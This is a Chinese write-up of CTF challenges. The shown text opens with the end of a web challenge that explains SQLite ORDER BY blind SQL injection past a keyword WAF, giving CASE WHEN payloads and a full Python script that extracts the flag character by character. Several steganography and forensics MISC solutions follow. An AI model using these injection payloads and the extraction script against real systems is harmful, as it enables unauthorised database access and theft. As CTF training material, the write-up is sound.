只有 id 和 name 进入 sql 查询，其中：
    id 可能只接受数字；
    name 接受除 waf 规则外的的任意字符。

根据 sql 经验，能够实现类似 name 这样的模糊查询，一般是 LIKE 或者 INSTR 等操作，这类操作一般都会绑定具体的参数或者索引。
所以我们可以尝试对 id 进行注入。

这里是难点 1：
怎么发现注入点？

有经验的你可能会尝试多种测试 payload，直接发现这是 order by 注入，否则会卡在这。

kkk，任意不包含 sqlite 关键字，则报错；
1，返回编号 1；
0，无返回；
id，正常返回；
-id，倒序返回；
1 desc，倒序返回。

难点 2，如何检测是什么类型的数据库？

waf 拦截了大多数的 sqlite 关键字，你可能需要先写一个脚本，将所有数据库的关键字都用来访问测试，然后得到一个可用列表，来进行侧面判断。

(SELECT typeof(1))='1'，返回正常页面，sqlite 专有函数。
(SELECT date('now'))>'' ，返回正常，sqlite。
(SELECT version())>''，返回错误，MySQL/PG 专有函数。
(SELECT sleep(1)) IS NULL，返回错误，MySQL 专有。

结果，我们能知道这是一个 sqlite 排序注入（ORDER BY 可控），因为页面的内容顺序可控。

接下来是难点 2：
如何利用这个排序将数据库中的内容注出来？

定义 bool 真假条件，将排序转换为布尔值进行判断：
当排序倒序时，为真；
当排序正序时，为假。

接下来是尝试可用的语句。
众所周知，sqlite 中是没有 IF ELSE 的，但是有 CASE WHEN 可以实现类似的功能。
[ORDER BY SQL Injection](https://khalid-emad.gitbook.io/order-by-sql-injection)

CASE WHEN 1=1 THEN id ELSE -id END ，正序返回。
CASE WHEN 1=1 THEN -id ELSE id END ，倒序返回。
CASE WHEN ((SELECT 1) = 1) THEN -id ELSE id END ，倒序返回，子查询可用。

这说明 CASE WHEN 能够作为注入语句。

最后是难点 3，如何从 flag 表中取 flag？

当你想要尝试直接复制上面那个 URL 中的 payload，会发现被 waf detect。
CASE WHEN ((SELECT substr(flag, 1, 1) FROM flag) = 'f') THEN -id ELSE id END

换成 LIKE 也不行
CASE WHEN ((SELECT flag FROM flag WHERER flag LIKE "f%")) THEN -id ELSE id END

怎么办怎么办怎么办

大多数关系型数据库，在默认情况下，都是逐字符进行比较，
所以我们可以利用这个特性，来比较 flag 中的字符。

为什么？
在 MySQL、PostgreSQL、Oracle 数据库中，数据类型是强约束的，当插入的值与类型不匹配则直接报错。
但 sqlite 是弱类型的，他会尝试把插入的值按照你定义的类型进行转换。
但我这里的 flag 是 uuid4.hex 生成的，所以不涉及转换操作。

提一下，什么是弱类型？
假设我使用下面的语句创建 flag 表，且 flag 是纯数字：
    create table if not exists flag (
        flag numeric not null

这就创建了一个 flag 表，其中 flag 字段的类型是 numeric
当执行
    INSERT INTO flag (flag) VALUES (?)

会将 flag 值以数值形式存储。这会使得逐字符比较失效。

当使用下面这段语句创建 flag 表，且 flag 是纯数字：
    create table if not exists flag (
        flag text not null

sqlite 会尝试将 flag 字段的类型转换为 text，这时候可以使用逐字符比较。
这就是列的亲和性，用于告诉 sqlite 更倾向以什么样的数据类型存储，如果转换失败则按 text 存储。

引用
[Datatypes In SQLite](https://www.sqlite.org/datatype3.html#affinity)
[SQLite剖析(4)：数据类型](https://blog.csdn.net/zhoudaxia/article/details/8194577)
[sqlite中text类型的比较规则](https://blog.csdn.net/douxinchun/article/details/9113789)

有了这些知识，我们就可以知道如何获取 flag —— 逐字符比较。

CASE WHEN (SELECT min(flag) FROM flag) > 'a' THEN -id ELSE id END
CASE WHEN (SELECT min(flag) FROM flag) >= 'flag{a' THEN -id ELSE id END

编写脚本，获取 flag。



((SELECT 1=0) * -id), id ，正序返回，-id = 倒序为真，作为 True，False * True = False
((SELECT 1=1) * -id), id ，倒序返回
((SELECT exists(SELECT 1 FROM flag WHERE flag >= 'flag{a' AND flag < 'flag{|') ) * -id), id
(( (SELECT 1 FROM flag WHERE flag >= 'flag{a' AND flag < 'flag{|') is not null) * -id), id
((SELECT (min(flag) >= 'flag{a' AND min(flag) < 'flag{|') FROM flag) * -id), id
((SELECT (max(flag) >= 'flag{a' AND max(flag) < 'flag{|') FROM flag) * -id), id
((SELECT ((flag >= 'flag{a') + (flag < 'flag{z') < 2) FROM flag) * -id), id
'''
```

exp：

```
import re
import requests

url = 'http://challenge.bluesharkinfo.com:23855/'

SELECT = 'SELECT '
FROM = ' FROM '

sql_case = 'CASE WHEN ({expr}) THEN -id ELSE id END, ID'
sql_len_flag = f"(({SELECT}length(flag){FROM}flag)>={{mid}})"
sql_char = f"(({SELECT}flag{FROM}flag)>='{{pre}}')"

def req(payload):
    '''
    使用 payload 发起 GET 请求，并将结果以文本形式返回
    :return str: 页面文本 r.text
    '''
    page = 1
    r = requests.get(
        url,
        params={
            'id': payload,
            'p': page
        },
        timeout=20
    )
    return r.text

def check(text):
    '''
    使用正则表达式匹配页面第一个编号，然后比较是否发生了排序
    :return bool: 8 True，1 False
    '''
    pat = r'编号.*?(\d+)<'
    r = re.search(pat, text)

    # http 400
    if not r:
        return False

    n = int(r.group(1))
    return n == 8

def ask(expr):
    '''
    将 expr 放到 sql_case 的子查询中，然后测试是否发生了排序
    :return bool: 是否发生了排序，是 True，否 False
    '''
    payload = sql_case.format(expr=expr)
    r = req(payload)
    c = check(r)
    return c

def binary_search_len(low=1, high=64):
    '''
    二分猜 flag 长度
    在 low 与 high 的范围，利用二分算法，使用 mid 作为子查询发起请求，判断 flag 的长度

    由于前面的 sql_len_flag 使用的是 >= 来判断，所以这里需要返回上界 high
    如果是 ...flag) = {{mid}})" 则返回 mid 值

    :return int: 找到的数据库中字符串的长度
    '''
    while low <= high:
        mid = (low + high) // 2
        # print(f'\tbslen mid ==> {mid}')

        expr = sql_len_flag.format(mid=mid)
        r = ask(expr)
        if r:
            low = mid + 1
        else:
            high = mid - 1

    return high

def binary_search_char(prefix, low=32, high=126):
    '''
    二分猜 flag 字符
    :return str: 找到的字符
    '''
    while low <= high:
        mid = (low + high) // 2
        # print(f'\tbschar mid ==> {mid} => {chr(mid)}')

        pre = prefix + chr(mid)
        payload = sql_char.format(pre=pre)

        if ask(payload):
            low = mid + 1
        else:
            high = mid - 1

    return chr(high)

def run():
    flag_len = binary_search_len()
    prefix = ''

    print(f'flag_len ==> {flag_len}')

    for i in range(1, flag_len + 1):
        ch = binary_search_char(prefix)
        prefix += ch
        print(f'prefix ==> {prefix}')

    print(f'flag ==> {prefix}')

rr = [
    # SQL 标准通用
    "select", "insert", "update", "delete", "create", "drop", "alter",
    "from", "where", "group", "by", "having", "order", "asc", "desc",
    "and", "or", "not", "null", "is", "in", "exists", "between",
    "case", "when", "then", "else", "end",
    "union", "all", "distinct", "into", "values", "set", "join",
    "inner", "left", "right", "full", "outer", "cross", "on",
    "as", "like", "limit", "offset", "top",

    # SQLite 特有
    "sqlite_master", "pragma", "autoincrement", "rowid",
    "randomblob", "zeroblob", "strftime", "date", "time",
    "datetime", "julianday",

    # MySQL 特有
    "auto_increment", "engine", "show", "explain", "describe",
    "database", "databases", "if", "else", "elseif", "elseif",
    "sleep", "benchmark", "now", "curdate", "date_format",

    # PostgreSQL 特有
    "serial", "bigserial", "text", "boolean",
    "ilike", "similar", "to", "overlaps",
    "returning", "with", "recursive",
    "pg_sleep", "extract", "interval",

    # SQL Server 特有
    "identity", "nvarchar", "nchar", "bit", "money",
    "uniqueidentifier", "isnull", "len", "getdate",
    "row_number", "over", "partition",

    # Oracle 特有
    "dual", "rownum", "connect", "start", "with", "prior",
    "sysdate", "systimestamp", "nvl", "decode", "rank", "over",

    # 常见函数关键字（多数数据库都保留）
    "abs", "substr", "substring", "length", "char_length",
    "lower", "upper", "replace", "trim", "coalesce",
    "ifnull", "isnull", "cast", "convert",
    "avg", "sum", "min", "max", "count",
]

def kw_check(text):
    '''当发生查询错误，则表明过了 WAF，进入查询语句'''
    if 'query error' in text:
        return True
    return False

def kw_run():
    result = []
    for kw in rr:
        r = req(kw)
        c = kw_check(r)
        if c:
            result.append((kw, c))
    return result

def show_kw(result):
    for kw, c in result:
        print(f'{kw} ==> {c}')

show_kw(kw_run())
run()
```

执行流程

```
长度猜解
python

# 如果 length(flag) >= mid 成立 → ask() 返回 True
# 说明实际长度 >= mid，向上搜索
if r:  # True
    low = mid + 1
else:  # False
    high = mid - 1
return high  # 返回上界（最大成立值）

字符猜解
python

# 如果 flag >= 'prefix+chr(mid)' 成立
# 说明实际字符 >= chr(mid)，向上搜索
pre = prefix + chr(mid)  # 构造测试前缀
if ask(payload):  # 条件成立
    low = mid + 1
else:
    high = mid - 1
return chr(high)  # 返回最大的成立字符

执行流程

    kw_run()：测试可用的 SQL 关键字

    binary_search_len()：确定 flag 长度

    for i in range(1, flag_len + 1):：逐个字符猜解

    输出完整的 flag
```

---

# MISC

## 湖心亭看雪

下载附件得到一个test.py和一张图片

test.py

```
a = b'*********' #这个东西你以后要用到
b = b'blueshark' 
c = bytes([x ^ y for x, y in zip(a, b)])
print(c.hex())
#c = 53591611155a51405e
```

ai一把梭解出来a值

```
15ctf2025
```

用010editor检查发现图片末尾有额外的十六进制数据，并且发现应该是zip文件缺少了文件头，补充完文件头用a值解压得到flag.txt  

题目提示应该是snow隐写，用a值作为密钥解密得到flag

---

## 阿利维亚的传说

下载附件得到一个zip文件，解压得到一张图片和一个docx文件

用binwalk提取docx文件

在word下的document.xml找到谕言1

```
        <w:t>谕言1:</w:t>
        </w:r>
    </w:p>
    <w:p w14:paraId="6795ABED" w14:textId="77777777" w:rsidR="000055E9" w:rsidRPr="000055E9" w:rsidRDefault="000055E9" w:rsidP="000055E9">
        <w:pPr>
            <w:jc w:val="center"/>
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
        </w:pPr>
        <w:r w:rsidRPr="000055E9">
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
            <w:t>V=Dortt</w:t>
        </w:r>
    </w:p>
    <w:p w14:paraId="73F17E5C" w14:textId="77777777" w:rsidR="000055E9" w:rsidRPr="000055E9" w:rsidRDefault="000055E9" w:rsidP="000055E9">
        <w:pPr>
            <w:jc w:val="center"/>
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
        </w:pPr>
        <w:r w:rsidRPr="000055E9">
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
            <w:t>A=otuTa</w:t>
        </w:r>
    </w:p>
    <w:p w14:paraId="1B466592" w14:textId="12897268" w:rsidR="000055E9" w:rsidRPr="000055E9" w:rsidRDefault="000055E9" w:rsidP="000055E9">
        <w:pPr>
            <w:jc w:val="center"/>
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
        </w:pPr>
        <w:r w:rsidRPr="000055E9">
            <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:vanish/>
                <w:sz w:val="24"/>
            </w:rPr>
            <w:t>N=NTsin</w:t>
        </w:r>
    </w:p>
```

用zsteg分析图片然后base64解码得到谕言2

```
6LCV6KiAMjoKVz1Ib2VpaApIPW91VGdvCmw9cE1oaGkKTD1lYWV0YwpFPVlrckNl

谕言2:
W=Hoeih
H=ouTgo
l=pMhhi
L=eaetc
E=YkrCe
```

然后png文件binwalk得到zip解压，四位数字爆破密码得到谕言3

```
谕言3:
T=FMfr
R=iytY
U=nGFo   
E=diou
```

然后这里出题人神了

```
从左边开始从上到下开始读可以得到一句话，在把它们拼接在一起的得到flag
```

```
V=Dortt
A=otuTa    DoNotTrustTitan
N=NTsin

W=Hoeih
H=ouTgo
l=pMhhi     HopeYouMakeTherightChoice
L=eaetc
E=YkrCe

T=FMfr
R=iytY
U=nGFo    FindMyGiftForYou
E=diou

ISCTF{DoNotTrustTitan_HopeYouMakeTherightChoice_FindMyGiftForYou}
```

---

## 小蓝鲨的神秘文件

下载附件然后解压得到`ChsPinyinUDL.dat`文件

没见过这个文件搜一下

**发现好像是一个windows中文输入法词库文件**

这个文件以一定的编码方式储存了出题人的输入法按键情况，我们需要脚本将他的输入词汇还原出来，于是利用网上大佬的脚本https://github.com/studyzy/imewlconverter/files/4365598/pinyin.zip，

解出来

```
E:\CTF\misc工具\pinyin>pinyin.exe ChsPinyinUDL.dat
帮我优化这段代码        bang wo you hua zhe duan dai ma 1
不要乱动我的代码        bu yao luan dong wo de dai ma   1
不要动我原来的代码      bu yao dong wo yuan lai de dai ma       1
出题人说弗莱格在官网    chu ti ren shuo fu lai ge zai guan wang 1
出题人说弗莱格在那里    chu ti ren shuo fu lai ge zai na li     1
官网的新闻里    guan wang de xin wen li 1
弗莱格  fu lai ge       1
还有一些项目合作的机会  hai you yi xie xiang mu he zuo de ji hui        1
福州蓝鲨信息技术有限公司        fu zhou lan sha xin xi ji shu you xian gong si  1
机会是留给有准备的人    ji hui shi liu gei you zhun bei de ren  1
看看官网的新闻吧        kan kan guan wang de xin wen ba 1
你把简历投了再说        ni ba jian li tou le zai shuo   1
你去看看新闻动态呢      ni qu kan kan xin wen dong tai ne       1
你去找辅导员问问        ni qu zhao fu dao yuan wen wen  1
你去蓝鲨官网看看呗      ni qu lan sha guan wang kan kan bei     1
你这个脚本跑不了啊      ni zhe ge jiao ben pao bu liao a        1
他们招实习的    ta men zhao shi xi de   1
这次比赛你参加了吗      zhe ci bi sai ni can jia le ma  1
真的可以去试试  zhen de ke yi qu shi shi        1
在我原来的基础上修改    zai wo yuan lai de ji chu shang xiu gai 1
```

出题人说我们的flag在福州蓝鲨信息技术有限公司的官网新闻里

找到flag

```
ISCTF{我要和小蓝鲨组一辈子CTF战队}
```

---

## 美丽的风景照

得到一张gif，直接用随波逐流动图分解帧

得到七张图，每个图中分别有一段字符串

```
jqW2 Dg2C 7HLo8 6yRWh ZXw8T 98Mz 3CaEK
```

然后根据第一个HINT，红橙黄绿青蓝紫来排序 

```
jqw2 Dg2C 7HLo8 6yRWh 3CaEK ZXw8T 98Mz
```

然后根据第二个提示，将跟古风有关的字符串都倒过来写（红色、橙色、靛色）

```
2Wqj C2gD 7HLo8 6yRWh KEaC3 ZXw8T 98Mz
```

然后base58解密得到flag

```
ISCTF{H0w_834u71fu1!!!}
```

这个题目也是神了

---

## The truth of the pixel

下载附件得到一个加密zip文件，直接爆破密码

得到密码`123456`

解压之后得到`challenge.png`，发现图片中有flag，但是是假的。

clockedpixels隐写，lsb可以看到明显特征（我也不知道明显特征在哪）

使用PuzzleSolver工具，在BruteForce中找到cloacked-pixel，然后字典选择rockyou.txt

然后再输出文件夹中的text里找到flag

---

## Abnormal log

得到日志文件里面包含了很多file data segment，将它们提取出来并拼接在一起并进行0x05异或可以得到7z文件，让ai写一个脚本一键生成

```
import re
import os
 
 
def process_log_data(log_filepath="access.log", xor_key=0x05, output_filename="result.7z"):
    """
    从 access.log 文件中提取文件数据碎片，按文件顺序拼接（默认按提取顺序即视为排序），
    对每个字节进行 XOR 0x05 操作，并将结果保存为 .7z 文件。
    """
    print(f"--- 文件恢复脚本启动 ---")
 
    try:
        # 尝试以 UTF-8 编码读取日志文件
        with open(log_filepath, 'r', encoding='utf-8', errors='ignore') as f:
            log_content = f.read()
    except FileNotFoundError:
        print(f"错误：找不到文件 '{log_filepath}'。请确保文件在当前目录下。")
        return
 
    # 1. 提取文件数据碎片
    # 查找所有形如 'File data segment: HEX_STRING' 的行，并提取十六进制字符串。
    # **注意：我们假设日志中数据碎片的记录顺序大致遵循 segment number 的顺序。**
    data_pattern = re.compile(r"File data segment: ([0-9a-fA-F]+)")
    hex_segments = data_pattern.findall(log_content)
 
    if not hex_segments:
        print("错误：未在日志文件中找到任何文件数据碎片 (File data segment)。")
        return
 
    # 2. 拼接碎片（已按提取顺序视为排序并拼接）
    print(f"成功提取到 {len(hex_segments)} 个文件数据碎片。")
    concatenated_hex = "".join(hex_segments)
 
    # 检查是否提取了足够的数据
    if not concatenated_hex:
        print("错误：提取到的十六进制数据为空。")
        return
 
    try:
        # 将十六进制字符串转换为原始字节数据
        binary_data = bytes.fromhex(concatenated_hex)
    except ValueError:
        print("错误：拼接后的数据不是有效的十六进制字符串，请检查提取的日志内容。")
        return
 
    # 3. 对每个字节进行 XOR 0x05 操作
    print(f"开始进行 XOR {hex(xor_key)} 解密操作...")
    xored_data = bytes([b ^ xor_key for b in binary_data])
 
    # 4. 保存为 .7z 文件
    try:
        with open(output_filename, 'wb') as f:
            f.write(xored_data)
        print(f"操作成功！解密后的数据已保存为文件：'{output_filename}'")
        print(f"文件大小：{len(xored_data)} 字节。")
    except IOError:
        print(f"错误：无法写入文件 '{output_filename}'，请检查权限。")
 
 
# 执行函数
if __name__ == "__main__":
    process_log_data()
```

---

## 小蓝鲨的周年庆礼物

**附件包含两个文件，一个是名为 `这里没有flag` 的无后缀文件，一个是 `nothing is here.png`。拿到附件的第一时间是查看两个文件的十六进制数据是否存在隐写或者冗余修改数据。**

**这个无后缀文件的十六进制数据十分混乱，不具备任何合理的文件头和文件结构，但同时这个文件的大小又十分规整。**

**这种文件在电子取证比赛中经常出现，很容易猜到是VC容器**

**但是VC容器的挂载一般会需要密码，这里没有给出密码，给出了一个意义不明的文件 `nothing is here.png`。这要用到 VC 容器的特性密钥文件挂载**

**解题步骤：**

1. 使用图片作为密钥文件挂载

2. 打开挂载好的磁盘后发现里面有文件 `flag.txt`，不难观察到可见字符与实际字符数量对不上，很明显的零宽字符隐写。

3. 直接在线解密网站解密得到flag


---

## 星髓宝盒

下载附件得到一张图片，用foremost进行分离

分离出zip压缩包，解压得到三个文件

其中 真-星髓宝盒.zip 文件设置了密码，用zip爆破不出来

说明需要根据已给的另外两个文件进行求解，进而得到压缩包的密码

打开文件一（你是优秀学生吗.txt），这是一个txt文档

打开后发现很明显是一个文本隐水印

**在线网址：** **https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html**

将文档中的内容解密之后

得到：

```
‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‬‌‌‌‌‌‍‬‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‍‬你虽然能走到这一步‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‌‌‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‍‍‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍﻿‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‍‌‌‌‌‌‌﻿‌﻿，‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‬‌但还不是优秀学生哦‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿，‌‌‌‌‌﻿‍‌flag是专属于优秀学生的奖励，优秀学生自会知道他的咒语
```

发现还套了一层零宽隐写

**在线网址：****https://tool.bfw.wiki/tool/1695021695027599.html**

解密之后得到以下明文

```
5b298e6836902096e9316756d3b58ec4
```

根据给的文件二（星髓宝盒.jpg），点击属性，查看详细信息里可以看到

备注中有一个md5的网址，对应了第一个文件得到的32 个十六进制字符组成的字符串

```
https://www.somd5.com/
```

最终得到密码：

```
!!!@@@###123
```

打开加密压缩包（真-星髓宝盒）

得到flag

---



















